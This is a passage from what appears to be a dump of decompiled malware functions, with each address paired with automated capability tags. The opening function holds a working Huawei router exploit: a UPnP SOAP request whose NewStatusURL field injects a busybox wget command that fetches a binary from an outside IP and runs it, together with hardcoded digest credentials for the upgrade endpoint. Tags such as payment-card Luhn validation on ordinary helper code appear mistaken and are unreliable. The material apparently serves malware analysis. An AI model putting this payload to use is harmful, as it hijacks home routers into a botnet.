0x934;\n                    *(puVar15 + -0x18) = 4;\n                    *(puVar15 + -0x1c) = 1;\n                    *(puVar15 + -0x20) = *puVar18;\n                    *(puVar15 + -0x24) = 0x804cbc5;\n                    uVar8 = fcn.0805024b();\n                    if ((uVar8 | *(puVar15 + 0x934)) == 0) {\n                        uVar9 = extraout_ECX;\n                        if (puVar18[2] == 3) {\ncode_r0x0804ccf6:\n                            *(puVar15 + -4) = uVar9;\n                            *(puVar15 + -8) = 0x200;\n                            *(puVar15 + -0xc) = 0;\n                            puVar5 = puVar18 + 0x47;\n                            *(puVar15 + -0x10) = puVar15 + 0x610;\n                            *(puVar15 + -0x14) = 0x804cd11;\n                            fcn.0804fef9();\n                            *(puVar15 + -0xc) =\n                                 \"<?xml version=\\\"1.0\\\" ?><s:Envelope xmlns:s=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" s:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\"><s:Body><u:Upgrade xmlns:u=\\\"urn:schemas-upnp-org:service:WANPPPConnection:1\\\"><NewStatusURL>$(/bin/busybox wget -g 194.55.224.203 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\"\n                            ;\n                            *(puVar15 + -0x10) = puVar15 + 0x610;\n                            *(puVar15 + -0x14) = 0x804cd25;\n                            fcn.0804e540();\n                            *(puVar15 + -0x10) = puVar15 + 0x610;\n                            *(puVar15 + -0x14) = 0x804cd33;\n                            uVar9 = fcn.0804e4f0();\n                            *(puVar15 + 0x92b) = 0;\n                            *(puVar15 + 0x92f) = 0;\n                            *(puVar15 + -8) = puVar15 + 0x92b;\n                            *(puVar15 + -0xc) = 10;\n                            *(puVar15 + -0x10) = uVar9;\n                            *(puVar15 + -0x14) = 0x804cd59;\n                            fcn.0804e920();\n                            *(puVar15 + -0xc) =\n                                 \"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\\r\\nConnection: keep-alive\\r\\nAccept: */*\\r\\nAuthorization: Digest username=\\\"dslf-config\\\", realm=\\\"HuaweiHomeGateway\\\", nonce=\\\"88645cefb1f9ede0e336e3569d75ee30\\\", uri=\\\"/ctrlt/DeviceUpgrade_1\\\", response=\\\"3612f843a42db38f48f59d2a3597e19c\\\", algorithm=\\\"MD5\\\", qop=\\\"auth\\\", nc=00000001, cnonce=\\\"248d1a2560100669\\\"\\r\\nContent-Length: \"\n                            ;\n                            *(puVar15 + -0x10) = puVar5;\n                            *(puVar15 + -0x14) = 0x804cd66;\n                            fcn.0804e540();\n                            *(puVar15 + -0xc) = puVar15 + 0x92b;\n                            *(puVar15 + -0x10) = puVar5;\n                            *(puVar15 + -0x14) = 0x804cd76;\n                            fcn.0804e510();\n                            *(puVar15 + -0xc) = \"\\r\\n\\r\\n\";\n                            *(puVar15 + -0x10) = puVar5;\n                            *(puVar15 + -0x14) = 0x804cd83;\n                            fcn.0804e510();\n                            *(puVar15 + -0xc) = puVar15 + 0x610;\n                            *(puVar15 + -0x10) = puVar5;\n                            *(puVar15 + -0x14) = 0x804cd93;\n                            fcn.0804e510();\n                            *(puVar15 + -0x10) = puVar5;\n                            *(puVar15 + -0x14) = 0x804cd9b;\n                            uVar9 = fcn.0804e4f0();\n                            *(puVar15 + -0x14) = 0x4000;\n                            *(puVar15 + -0x18) = uVar9;\n                            *(puVar15 + -0x1c) = puVar5;\n                            *(puVar15 + -0x20) = *puVar18;\n                            *(puVar15 + -0x24) = 0x804cdaa;\n                            fcn.0805031f();\n                            *(puVar15 + -0xc) = 0x400;\n                            *(puVar15 + -0x10) = puVar5;\n                            *(puVar15 + -0x14) = 0x804cdb8;\n                            fcn.0804e5b0();\n                            *(puVar15 + -0xc) = 0x100;\n                            *(puVar15 + -0x10) = puVar18 + 6;\n                            *(puVar15 + -0x14) = 0x804cdc8;\n                            fcn.0804e5b0();\n                            puVar18[2] = 4;\n                            goto code_r0x0804caa5;\n                        }\n                        if (puVar18[2] != 4) {\n                            uVar8 = *puVar18;\n                            puVar18[2] = 3;\n                            goto code_r0x0804ca8e;\n                        }\n                    }\n                    *(puVar15 + -0x10) = *puVar18;\n                    *(puVar15 + -0x14) = 0x804cde2;\n                    fcn.0804eaab();\n                    *puVar18 = 0xffffffff;\n                    puVar18[2] = 0;\n                }\n            }\ncode_r0x0804caa5:\n            iVar6 = *(puVar15 + 0x938) + 1;\n            *(puVar15 + 0x938) = iVar6;\n        } while (iVar6 < 0x80);\n    } while( true );\n}\n",
        "token_count": 7454
    },
    "0804f011": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0804f011(uint param_1, uint param_2)\n\n{\n    fcn.0804f030(param_1, 0xffffffff, param_2, &stack0x0000000c);\n    return;\n}\n",
        "token_count": 53
    },
    "0804f030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.0804f030(uchar *param_1, uint32_t param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    ushort uStack96;\n    uchar uStack94;\n    uint uStack92;\n    uchar *puStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uchar *puStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack52;\n    uint uStack44;\n    uchar auStack40 [24];\n    \n    uStack92 = 0xfffffffe;\n    uStack96 = 0xd0;\n    uStack94 = 0;\n    uStack52 = 0;\n    uStack44 = 1;\n    fcn.0804f143(auStack40);\n    uStack64 = 0;\n    uVar2 = ~param_1;\n    if (param_2 < ~param_1) {\n        uVar2 = param_2;\n    }\n    puStack84 = param_1 + uVar2;\n    puStack88 = param_1;\n    puStack80 = param_1;\n    puStack76 = param_1;\n    puStack72 = param_1;\n    puStack68 = puStack84;\n    uVar1 = fcn.0804f2ad(&uStack96, param_3, param_4, puStack84);\n    if (uVar2 != 0) {\n        if (puStack80 == puStack84) {\n            puStack80 = puStack84 + -1;\n        }\n        *puStack80 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 377
    },
    "0804f143": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0804f143(uint param_1)\n\n{\n    fcn.0804feab(param_1, 0x805426c, 0x18);\n    return;\n}\n",
        "token_count": 43
    },
    "0804f15a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0804f15a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    uint uStack12;\n    \n    fcn.0804f143(0x8056544);\n    fcn.0804f143(0x805655c);\n    for (puVar3 = *0x8056540; puVar4 = *0x8056540,  puVar3 != NULL; puVar3 = *(puVar3 + 0x10)) {\n        iVar2 = fcn.08051b26(puVar3 + 0x1c);\n        if (iVar2 != 0) {\n            uVar1 = *(puVar3 + 4);\n            *puVar3 = 0x30;\n            *(puVar3 + 0xc) = uVar1;\n            *(puVar3 + 0xe) = uVar1;\n            *(puVar3 + 8) = uVar1;\n            *(puVar3 + 10) = uVar1;\n        }\n        *(puVar3 + 0x1a) = 1;\n        fcn.0804f143(puVar3 + 0x1c);\n    }\n    for (; puVar4 != NULL; puVar4 = *(puVar4 + 0x10)) {\n        if ((*puVar4 & 0x40) != 0) {\n            fcn.0804f1e2(puVar4);\n        }\n    }\n    return uStack12;\n}\n",
        "token_count": 344
    },
    "0804f1e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0804f1e2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint uStack12;\n    \n    iVar1 = *(param_1 + 8);\n    iVar2 = *(param_1 + 0x10) - iVar1;\n    if (iVar2 != 0) {\n        *(param_1 + 0x10) = iVar1;\n        fcn.080525a6(param_1, iVar1, iVar2, in_ECX);\n    }\n    return CONCAT44(uStack12, *(param_1 + 0x10) - *(param_1 + 8));\n}\n",
        "token_count": 153
    },
    "0804f20d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __regparm3 fcn.0804f20d(uint param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar uStack13;\n    \n    uStack13 = param_2;\n    for (iVar1 = param_3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        uVar2 = fcn.08052624(&uStack13, 1, param_1, param_2);\n        param_2 = uVar2 >> 0x20;\n        if (uVar2 != 1) break;\n    }\n    return param_3 - iVar1;\n}\n",
        "token_count": 154
    },
    "0804fe04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.0804fe04(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uStack12;\n    \n    iVar1 = fcn.0804ff0e(param_1);\n    iVar2 = fcn.0804fe37(param_1, 1, iVar1, param_2);\n    iVar3 = -1;\n    if (iVar2 == iVar1) {\n        iVar3 = iVar2;\n    }\n    return CONCAT44(uStack12, iVar3);\n}\n",
        "token_count": 127
    },
    "0804fe37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __regparm2\nfcn.0804fe37(uint param_1, uint param_2, uint param_3, uint32_t param_4, uint32_t param_5, uint16_t *param_6)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    if (((((*param_6 & 0xc0) == 0xc0) || (iVar1 = fcn.08052714(param_6, 0x80, param_2, param_2),  iVar1 == 0)) &&\n        (param_4 != 0)) && (param_5 != 0)) {\n        uVar2 = 0xffffffff / param_4;\n        if (param_5 <= uVar2) {\n            uVar2 = fcn.08052624(param_3, param_4 * param_5, param_6, uVar2);\n            return uVar2 / param_4;\n        }\n        *param_6 = *param_6 | 8;\n        puVar3 = fcn.0804efb0();\n        *puVar3 = 0x16;\n    }\n    return 0;\n}\n",
        "token_count": 265
    },
    "0804ff3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nulong fcn.0804ff3a(uint8_t *param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint32_t uStack24;\n    \n    uVar5 = *param_2;\n    if (uVar5 != 0) {\n        param_1 = param_1 + -1;\n        do {\n            puVar3 = param_1;\n            param_1 = puVar3 + 1;\n            if (*param_1 == 0) goto code_r0x0804fff7;\n        } while (*param_1 != uVar5);\n        uStack24 = param_2[1];\n        if (uStack24 != 0) {\n            uVar1 = puVar3[2];\n            puVar3 = puVar3 + 2;\n            do {\n                uVar2 = uVar1;\n                if (uVar2 == uStack24) {\n                    uVar1 = puVar3[1];\n                    puVar7 = param_2 + 2;\n                    puVar6 = puVar3 + 1;\n                    param_1 = puVar3 + -1;\n                    uVar4 = param_2[2];\n                    if (uVar1 == param_2[2]) {\n                        do {\n                            if (uVar1 == 0) goto code_r0x0804fff9;\n                            uVar4 = puVar7[1];\n                            if (puVar6[1] != uVar4) break;\n                            if (uVar4 == 0) goto code_r0x0804fff9;\n                            puVar6 = puVar6 + 2;\n                            puVar7 = puVar7 + 2;\n                            uVar1 = *puVar7;\n                            uVar4 = uVar1;\n                        } while (*puVar6 == uVar1);\n                    }\n                    if (uVar4 == 0) break;\n                    uVar2 = *puVar3;\n                }\n                while (puVar6 = puVar3,  uVar2 != uVar5) {\n                    if (uVar2 == 0) goto code_r0x0804fff7;\n                    puVar6 = puVar3 + 1;\n                    if (*puVar6 == uVar5) break;\n                    if (*puVar6 == 0) goto code_r0x0804fff7;\n                    puVar3 = puVar3 + 2;\n                    uVar2 = *puVar3;\n                }\n                puVar3 = puVar6 + 1;\n                uVar1 = *puVar3;\n            } while( true );\n        }\n    }\ncode_r0x0804fff9:\n    return CONCAT44(uStack24, param_1);\ncode_r0x0804fff7:\n    param_1 = NULL;\n    goto code_r0x0804fff9;\n}\n",
        "token_count": 667
    },
    "08050000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.08050000(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.0805001d(param_1, param_2, param_3);\n    return param_2;\n}\n",
        "token_count": 51
    },
    "080500d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.080500d4(uint param_1, uint param_2)\n\n{\n    fcn.08052fce(param_1, param_2, 0x8058860);\n    return;\n}\n",
        "token_count": 46
    },
    "08051493": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.08051493(void)\n\n{\n    uchar auStack24 [16];\n    uint uStack8;\n    \n    fcn.08051b29(auStack24, fcn.08051b26, 0x80566a0);\n    fcn.08051b26(0x80566a0);\n    fcn.08051523(0x80566b8, &uStack8);\n    fcn.08051b29(auStack24, 1);\n    return uStack8;\n}\n",
        "token_count": 114
    },
    "08051749": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.08051749(uint param_1)\n\n{\n    code **ppcVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    code *pcVar4;\n    code **ppcVar5;\n    int32_t iVar6;\n    int32_t aiStack92 [4];\n    code *apcStack76 [4];\n    code **ppcStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack40;\n    code *apcStack32 [2];\n    uchar auStack24 [16];\n    \n    fcn.08051b29();\n    fcn.08051b26();\n    pcVar4 = *0x8058868;\n    if (*0x8058868 != NULL) {\n        pcVar4 = (**0x8058868)();\n    }\n    uStack40 = 1;\n    apcStack32[0] = pcVar4;\n    fcn.08051b29();\n    fcn.08051ae7();\n    apcStack32[0] = 0x80517a7;\n    fcn.0804f15a();\n    fcn.0804ea83();\n    uStack52 = param_1;\n    puStack56 = &stack0xffffffe8;\n    iVar6 = 0;\n    ppcStack60 = &stack0xffffffe0;\n    do {\n        iVar6 = iVar6 + 1;\n        iVar2 = *ppcStack60;\n        ppcStack60 = ppcStack60 + 1;\n    } while (iVar2 != 0);\n    iVar2 = -(iVar6 * 4 + 0x22U & 0xfffffff0);\n    ppcVar1 = &stack0xffffffc0 + iVar2;\n    *ppcVar1 = pcVar4;\n    ppcStack60 = &stack0xffffffe0;\n    ppcVar5 = ppcVar1;\n    do {\n        ppcVar3 = ppcStack60;\n        ppcVar5 = ppcVar5 + 1;\n        iVar6 = iVar6 + -1;\n        ppcStack60 = ppcStack60 + 1;\n        pcVar4 = *ppcVar3;\n        *ppcVar5 = pcVar4;\n    } while (iVar6 != 0);\n    *(&stack0xffffffb4 + iVar2) = pcVar4;\n    *(&stack0xffffffb0 + iVar2) = *0x8058870;\n    *(&stack0xffffffac + iVar2) = ppcVar1;\n    *(&stack0xffffffa8 + iVar2) = uStack40;\n    *(&stack0xffffffa4 + iVar2) = 0x8051812;\n    fcn.08051f12();\n    return;\n}\n",
        "token_count": 606
    },
    "080519a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.080519a2(uint param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t aiStack8 [2];\n    \n    // switch table (150 cases) at 0x8054ea8\n    switch(param_1) {\n    case 0:\n        iVar2 = 0x20000;\n        break;\n    case 1:\n    case 0x17:\n    case 0x18:\n    case 0x1b:\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x29:\n    case 0x31:\n    case 0x32:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x55:\n    case 0x56:\n    case 0x60:\n    case 0x61:\n    case 0x74:\n    case 0x75:\n    case 0x7f:\n    case 0x80:\n    case 0x83:\n        goto code_r0x08051ab6;\n    case 2:\n        iVar2 = 100;\n        break;\n    case 3:\n        iVar2 = 0x10000;\n        break;\n    case 4:\n        iVar3 = fcn.080521bd(7, aiStack8);\n        iVar2 = 0x100;\n        if (-1 < iVar3) {\n            iVar2 = aiStack8[0];\n        }\n        return iVar2;\n    case 5:\n    case 0x6c:\n        iVar2 = 0x10;\n        break;\n    case 6:\n        iVar2 = 6;\n        break;\n    case 7:\n    case 8:\n    case 9:\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n    case 0x12:\n    case 0x13:\n    case 0x14:\n    case 0x15:\n    case 0x16:\n    case 0x43:\n    case 0x44:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n    case 0x54:\n    case 0x5b:\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x62:\n    case 99:\n    case 100:\n    case 0x7d:\n    case 0x7e:\n    case 0x81:\n    case 0x82:\n        iVar2 = 1;\n        break;\n    case 0x19:\n    case 0x6d:\n        iVar2 = 0x14;\n        break;\n    case 0x1a:\n    case 0x57:\n    case 0x68:\n    case 0x79:\n    case 0x7a:\n    case 0x7b:\n    case 0x7c:\n        iVar2 = 0x7fffffff;\n        break;\n    case 0x1c:\n        iVar2 = 0x8000;\n        break;\n    case 0x1d:\n    case 0x2e:\n    case 0x2f:\n    case 0x30:\n    case 0x33:\n    case 0x34:\n    case 0x5f:\ncode_r0x08051a8c:\n        iVar2 = 0x30db0;\n        break;\n    case 0x1e:\n        iVar2 = 0x1000;\n        if (*0x8058874 != 0) {\n            iVar2 = *0x8058874;\n        }\n        return iVar2;\n    case 0x1f:\n    case 0x2a:\n    case 0x48:\n    case 0x6a:\n    case 0x6b:\n        iVar2 = 0x20;\n        break;\n    case 0x23:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        iVar2 = 0x100;\n        break;\n    case 0x24:\n    case 0x26:\n        iVar2 = 99;\n        break;\n    case 0x25:\n    case 0x2b:\n    case 0x2d:\n    case 0x78:\n        iVar2 = 0x800;\n        break;\n    case 0x27:\n        iVar2 = 1000;\n        break;\n    case 0x28:\n    case 0x73:\n        iVar2 = 0xff;\n        break;\n    case 0x2c:\n    case 0x6e:\n    case 0x71:\n        iVar2 = 0x7fff;\n        break;\n    case 0x49:\n    case 0x5a:\n        iVar2 = 4;\n        break;\n    case 0x4a:\n    case 0x4c:\n        iVar2 = 0x400;\n        break;\n    case 0x4b:\n        iVar2 = 0x4000;\n        break;\n    case 0x58:\n        iVar2 = 0x1000;\n        break;\n    case 0x59:\n        iVar2 = 500;\n        break;\n    case 0x65:\n        iVar2 = 8;\n        break;\n    case 0x66:\n    case 0x6f:\n        iVar2 = 0x7f;\n        break;\n    case 0x67:\n    case 0x70:\n        iVar2 = -0x80;\n        break;\n    case 0x69:\n        iVar2 = -0x80000000;\n        break;\n    case 0x72:\n        iVar2 = -0x8000;\n        break;\n    case 0x76:\n        iVar2 = 0xffff;\n        break;\n    case 0x77:\n        iVar2 = 9;\n        break;\n    default:\n        puVar1 = fcn.0804efb0();\n        *puVar1 = 0x16;\n        goto code_r0x08051ab6;\n    case 0x95:\n        iVar2 = fcn.08051ee0(1, 0, param_1, param_1);\n        if (-1 < iVar2) goto code_r0x08051a8c;\ncode_r0x08051ab6:\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 1578
    },
    "08051d67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __regparm2 fcn.08051d67(uint param_1, uint param_2, uint param_3, uint *param_4, uint *param_5)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uchar auStack276 [128];\n    uint uStack148;\n    uint32_t uStack144;\n    uint uStack140;\n    uchar auStack136 [128];\n    \n    if (param_4 != NULL) {\n        uStack148 = *param_4;\n        fcn.0804feab(auStack136, param_4 + 1, 0x80, param_2);\n        uStack144 = param_4[0x21] | 0x4000000;\n        uStack140 = 0x8051d58;\n        if ((*(param_4 + 0x21) & 4) == 0) {\n            uStack140 = 0x8051d5f;\n        }\n    }\n    puVar3 = NULL;\n    if (param_5 != NULL) {\n        puVar3 = &uStack288;\n    }\n    puVar1 = NULL;\n    if (param_4 != NULL) {\n        puVar1 = &uStack148;\n    }\n    iVar2 = fcn.08051ea5(param_3, puVar1, puVar3, 8);\n    if ((param_5 != NULL) && (-1 < iVar2)) {\n        *param_5 = uStack288;\n        fcn.0804feab(param_5 + 1, auStack276, 0x80, uStack288);\n        param_5[0x21] = uStack284;\n        param_5[0x22] = uStack280;\n    }\n    return iVar2;\n}\n",
        "token_count": 417
    },
    "08051fff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t fcn.08051fff(uint arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint unaff_EBX;\n    uint *puVar9;\n    int32_t aiStack76 [7];\n    uint *var_2ch;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_14h;\n    uint var_ch;\n    \n    iVar5 = -(arg_10h + 0x1eU & 0xfffffff0);\n    var_2ch = &fcn.08051fff::var_2ch + iVar5;\n    *(&stack0xffffffc0 + iVar5) = unaff_EBX;\n    pcVar4 = swi(0x80);\n    var_14h = (*pcVar4)();\n    if (var_14h < 0xfffff001) {\n        if (var_14h != 0xffffffff) {\n            var_20h = 0xffffffff;\n            var_1ch = 0xffffffff;\n            puVar7 = var_2ch;\n            puVar9 = arg_ch;\n            do {\n                if (var_2ch + var_14h <= puVar7) {\ncode_r0x08052106:\n                    return puVar9 - arg_ch;\n                }\n                uVar8 = *(puVar7 + 4) + 3 & 0xfffffffc;\n                var_24h = puVar9 + uVar8;\n                if (arg_ch + arg_10h < var_24h) {\n                    *(&stack0xffffffc4 + iVar5) = 0;\n                    *(&stack0xffffffc0 + iVar5) = var_1ch;\n                    *(&stack0xffffffbc + iVar5) = var_20h;\n                    *(&stack0xffffffb8 + iVar5) = arg_8h;\n                    *(&stack0xffffffb4 + iVar5) = 0x8052092;\n                    fcn.08052254();\n                    if (puVar9 == arg_ch) {\n                        *(&stack0xffffffc4 + iVar5) = 0x805209f;\n                        puVar7 = fcn.0804efb0();\n                        *puVar7 = 0x16;\n                        return -1;\n                    }\n                    goto code_r0x08052106;\n                }\n                var_1ch = puVar7[3];\n                var_20h = puVar7[2];\n                uVar2 = *puVar7;\n                puVar9[1] = puVar7[1];\n                *puVar9 = uVar2;\n                uVar3 = puVar7[2];\n                puVar9[3] = puVar7[3];\n                puVar9[2] = uVar3;\n                *(puVar9 + 4) = uVar8;\n                uVar1 = *(puVar7 + 0x12);\n                *(puVar9 + 0x12) = uVar1;\n                *(&stack0xffffffc4 + iVar5) = uVar3 & 0xffffff00 | uVar1;\n                *(&stack0xffffffc0 + iVar5) = *(puVar7 + 4) - 0x13;\n                *(&stack0xffffffbc + iVar5) = puVar7 + 0x13;\n                *(&stack0xffffffb8 + iVar5) = puVar9 + 0x13;\n                *(&stack0xffffffb4 + iVar5) = 0x80520ec;\n                fcn.0804feab();\n                puVar7 = puVar7 + *(puVar7 + 4);\n                puVar9 = var_24h;\n            } while( true );\n        }\n    }\n    else {\n        *(&stack0xffffffc4 + iVar5) = 0x805203f;\n        piVar6 = fcn.0804efb0();\n        *piVar6 = -var_14h;\n    }\n    return -1;\n}\n",
        "token_count": 948
    },
    "080524be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.080524be(uchar *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uchar auStack24 [16];\n    uint *puStack8;\n    uint uStack4;\n    \n    if (param_1 == NULL) {\n        param_1 = auStack24;\n        param_2 = 0;\n    }\n    puStack8 = &uStack4;\n    uStack4 = param_2;\n    iVar1 = fcn.08052520(param_1, &puStack8, 1, 0x10, param_3);\n    if (iVar1 == 0) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 161
    },
    "08052502": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.08052502(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.08052520(param_1, param_2, 0xffffffff, param_3, param_4);\n    return;\n}\n",
        "token_count": 60
    },
    "0805324a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0805324a(uint param_1, int32_t param_2, uint param_3)\n\n{\n    fcn.08053265(param_1, param_2, param_2 >> 0x1f, param_3);\n    return;\n}\n",
        "token_count": 60
    },
    "080534e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.080534e6(void)\n\n{\n    // [03] -r-x section size 23 named .fini\n    fcn.080480b0();\n    fcn.080480c0();\n    return;\n}\n",
        "token_count": 51
    },
    "0804fa15": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar __regparm3 fcn.0804fa15(int32_t param_1)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    \n    piVar1 = 0x8054316;\n    do {\n        piVar2 = piVar1;\n        piVar1 = piVar2 + -1;\n        if (*piVar1 == param_1) break;\n    } while (0x80542fe < piVar1);\n    return *((piVar2 + -0x402a180 >> 1) + 0x8054316);\n}\n",
        "token_count": 129
    },
    "08048190": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.08048190(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    code **extraout_EDX;\n    code **ppcVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint uStack48;\n    uint32_t auStack44 [4];\n    uchar auStack28 [8];\n    uint32_t var_10h;\n    uint var_ch;\n    \n    puVar7 = &stack0xffffffe4;\n    arg_ch = arg_ch & 0xff;\n    arg_10h = arg_10h & 0xff;\n    arg_18h = arg_18h & 0xff;\n    auStack44[3] = 0x80481a9;\n    iVar3 = fcn.0804ead9();\n    if ((iVar3 == -1) || (0 < iVar3)) {\n        return;\n    }\n    auStack44[3] = 0x80481c5;\n    iVar3 = fcn.0804ead9();\n    puVar8 = &stack0xffffffe4;\n    if (iVar3 == -1) goto code_r0x08048212;\n    if (iVar3 != 0) goto code_r0x0804821c;\n    puVar7 = &stack0xffffffd4;\n    auStack44[0] = arg_8h;\n    fcn.08051819();\n    uVar4 = fcn.0804eb25();\n    arg_10h = auStack44[1];\n    arg_18h = auStack44[0];\n    auStack44[1] = 9;\n    auStack44[0] = uVar4;\n    fcn.0804eb4b();\n    auStack44[0] = 0;\n    fcn.08051749();\n    ppcVar6 = extraout_EDX;\ncode_r0x080481f5:\n    *(puVar7 + -4) = arg_1ch;\n    *(puVar7 + -8) = arg_18h & 0xff;\n    *(puVar7 + -0xc) = arg_14h;\n    *(puVar7 + -0x10) = arg_10h & 0xff;\n    pcVar2 = *ppcVar6;\n    *(puVar7 + -0x14) = 0x804820f;\n    (*pcVar2)();\n    arg_ch = arg_1ch;\n    puVar8 = puVar7;\ncode_r0x08048212:\n    do {\n        do {\n            puVar7 = puVar8 + -0x10;\n            *(puVar8 + -0x10) = 0;\n            *(puVar8 + -0x14) = 0x804821c;\n            fcn.08051749();\ncode_r0x0804821c:\n            var_10h = *0x805679c;\n            puVar8 = puVar7;\n        } while (var_10h == 0);\n        uVar5 = 0;\n        ppcVar6 = **0x80567a0;\n        cVar1 = *(ppcVar6 + 